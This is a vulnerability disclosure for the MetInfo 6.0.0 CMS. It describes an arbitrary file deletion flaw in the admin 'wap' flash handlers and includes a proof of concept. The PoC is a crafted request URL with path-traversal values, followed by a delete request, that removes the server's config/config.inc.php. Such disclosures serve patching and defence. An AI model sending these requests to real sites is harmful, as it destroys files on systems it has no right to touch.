Application: MetInfo
Versions Affected: 6.0.0
Vendor URL: http://www.metinfo.cn/
Software Link:https://www.metinfo.cn/upload/file/MetInfo6.0.0.zip
Bugs: Background Arbitrary File Deletion Vulnerability 
Author:only-wait
Description:
MetInfo was established in March 2009, is a enterprise CMS, more than 40 m enterprises in the use of MeInfo build their 
own enterprise website.


Vulnerability details：
An input validation vulnerability exists in /metinfo6.0.0/admin/app/wap/flashdelete.php that allows an attacker to delete an arbitrary file on the webserver that it resides on. 
The vulnerability is due to user can add any filename to the database from /admin/app/wap/flashsave.php, and read the value from /admin/app/wap/flashdelete.php, excute file_unlink function to delete it at last. 
---------------------------------------------
E-mail：2394464588@qq.com
blog: only-wait.cn


POC:
First,we request the url below in the browser: 
http://host/admin/app/wap/flashsave.php?lang=cn&anyid=&cs=1&met_flash_type=2&action=add&f_columnlist=123&met_clumid_all=1&flash_path=../config/config.inc.php&img_title=aaa&img_path=../config/config.inc.php&img_link=aaaaaaaaa&flash_back=../config/config.inc.php&no_order=1&width=123&height=1
Next click the 'edit' buttom and we will get the value of parameter 'id' if everything goes well:
Then request http://host/admin/app/wap/flash.php?action=del&allid=[the value you got] in the browser.
Once you finish these two steps, the file '/config/config.inc.php' on the server should be deleted right away. 